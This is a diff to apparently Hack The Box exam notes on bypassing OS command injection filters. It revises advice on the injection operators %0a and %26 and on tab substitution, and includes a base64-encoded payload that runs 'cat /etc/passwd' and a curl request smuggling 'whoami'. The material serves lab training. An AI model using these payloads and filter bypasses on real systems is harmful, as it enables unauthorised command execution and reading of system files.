@@ -65,11 +65,11 @@ curl -d "ip=127.0.0.1%0awhoami"
 | `;` | `%3b` | Usually blacklisted |
 | `&&` | `%26%26` | Usually blacklisted |
 | `\|\|` | `%7c%7c` | Usually blacklisted |
-| `\n` (newline) | `%0a` | **Often NOT blacklisted** — try this first |
-| `&` | `%26` | Often blacklisted |
+| `\n` (newline) | `%0a` | Often NOT blacklisted — try this first |
+| `&` | `%26` | **Also try this — can bypass filters that block `%0a`** |
 | `\|` | `%7c` | Often blacklisted |
 
-**The newline `%0a` is the most reliable operator bypass** — it's often omitted from blacklists.
+**Do not stop at `%0a`.** When `%0a` is blocked ("Malicious request denied"), immediately test `%26`. Filters that block newline-based injection often miss `&`. Enumerate every operator on the confirmed injection point — do not assume one operator and give up.
 
 ---
 
@@ -157,14 +157,15 @@ $(rev<<<'imaohw')      # → runs whoami
 
 ### Base64 encoding (most powerful — bypasses ALL character + command filters)
 ```bash
-# Step 1: encode locally
-echo -n 'cat /etc/passwd' | base64
-# → Y2F0IC9ldGMvcGFzc3dk
+# Step 1: encode locally — use echo (not echo -n) to include trailing newline
+echo 'cat /etc/passwd' | base64
+# → Y2F0IC9ldGMvcGFzc3dkCg==
 
-# Step 2: send encoded payload
-bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
+# Step 2: send encoded payload — use %09 (tab) for space, not ${IFS} (may be filtered)
+bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkCg==)
 
 # Note: use <<< instead of | to avoid pipe character being filtered
+# Note: trailing newline from echo (vs echo -n) ensures clean shell termination
 ```
 
 ---
@@ -236,9 +237,13 @@ Find input that feeds OS command
 
 ## HTB Exam Notes
 
-- **Blacklists are always incomplete** — newline `%0a` is almost never blocked
+- **Enumerate ALL operators, not just `%0a`** — `%0a` may be blocked; `%26` often isn't. Test every operator on the confirmed injection point before concluding the operator is blocked.
 - **Test in isolation** — strip the command and test just the operator to separate character vs command blacklisting
 - **Two independent filter layers** — character filter and command filter are checked separately
-- **Base64 is the nuclear option** — encodes everything, nothing needs to survive the filter except `bash<<<$(base64${IFS}-d<<<...)`
+- **Base64 is the nuclear option** — encodes everything, nothing needs to survive the filter except `bash<<<$(base64%09-d<<<...)`
+- **Use `%09` (tab) for space in the base64 invocation** — `${IFS}` may itself be filtered
+- **Use `echo` not `echo -n` for base64 encoding** — trailing newline ensures clean shell termination
 - **Always use single quotes in curl** — prevents local shell expansion of `${IFS}`, `${PATH:0:1}`, `$@`
-- **Compare response sizes** — if grep finds nothing, check `wc -c` to detect blind output changes
+- **Track target file state** — move/copy operations during testing change which files exist; always relist before constructing `from=` parameters
+- **Complete operation structure required** — some injection points only fire when ALL parameters for an operation are present (e.g., `to=`, `from=`, `finish=1`, `move=1` for TFM move)
+- **Diff to find output, don't grep for assumed formats** — use `diff baseline.html injected.html` to isolate exactly what the command added; don't assume `HTB{...}` format
